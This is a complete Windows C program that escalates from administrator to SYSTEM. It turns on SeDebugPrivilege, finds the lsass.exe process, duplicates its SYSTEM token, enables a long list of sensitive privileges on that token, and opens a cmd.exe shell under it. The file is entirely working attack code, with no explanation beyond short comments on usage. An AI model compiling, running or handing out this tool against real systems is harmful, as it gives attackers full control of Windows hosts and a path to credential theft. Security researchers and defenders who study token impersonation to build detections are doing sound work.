#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// see msdn documentation https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCWSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		wprintf(L"The token does not have the specified privilege: %s\n", lpszPrivilege);
		return FALSE;
	}

	return TRUE;
}

HANDLE GetProcessTokenForDuplication(DWORD pid)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
	{
		printf("OpenProcess error: %u\n", GetLastError());
		return NULL;
	}
	HANDLE hProcessToken = NULL;
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProcessToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		CloseHandle(hProcess);
		return NULL;
	}
	CloseHandle(hProcess);
	return hProcessToken;
}

// see msdn documentation https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
DWORD GetLsassProcess()
{
	HANDLE hProcessSnap;
	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot error: %u\n", GetLastError());
		return 0;
	}

	PROCESSENTRY32 pe32;
	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		printf("Process32First error: %u\n", GetLastError()); // show cause of failure
		CloseHandle(hProcessSnap); // clean the snapshot object
		return 0;
	}

	WCHAR processName[] = L"lsass.exe";
	do
	{
		if (_wcsicmp(pe32.szExeFile, processName) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return 0;
}

int wmain(int argc, WCHAR** argv)
{
	// enable debug privilege
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		return 1;
	}
	if (!SetPrivilege(hToken, L"SeDebugPrivilege", TRUE))
	{
		printf("Error setting SeDebugPrivilege: %u\n", GetLastError());
		return 1;
	}
	CloseHandle(hToken);

	// get a process (in our case lsass.exe) with SYSTEM privilege
	DWORD pid = GetLsassProcess();
	if (0 == pid)
	{
		printf("Cannot find lsass.exe process.\n");
		return 1;
	}

	// get a duplication of the SYSTEM process token so we can use to create cmd shell
	HANDLE hTargetToken = GetProcessTokenForDuplication(pid);
	if (!hTargetToken)
	{
		return 1;
	}
	HANDLE hDuplicatedToken = NULL;
	if (!DuplicateTokenEx(hTargetToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken))
	{
		printf("Could not duplicate process token: %u\n", GetLastError());
		CloseHandle(hTargetToken);
		return 1;
	}
	CloseHandle(hTargetToken);

	// comment out optional privileges you do not need.
	SetPrivilege(hDuplicatedToken, L"SeAssignPrimaryTokenPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeIncreaseQuotaPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeSecurityPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeTakeOwnershipPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeLoadDriverPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeSystemtimePrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeBackupPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeRestorePrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeShutdownPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeSystemEnvironmentPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeUndockPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeManageVolumePrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeTrustedCredManAccessPrivilege", TRUE);
	SetPrivilege(hDuplicatedToken, L"SeRelabelPrivilege", TRUE);

	// create cmd.exe process using duplicated process token
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);
	WCHAR cmdLine[] = L"cmd.exe";

	if (!CreateProcessWithTokenW(hDuplicatedToken, 0, NULL, cmdLine, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		printf("Create process with SYSTEM token failed: %u\n", GetLastError());
		CloseHandle(hDuplicatedToken);
		return 1;
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hDuplicatedToken);
	return 0;
}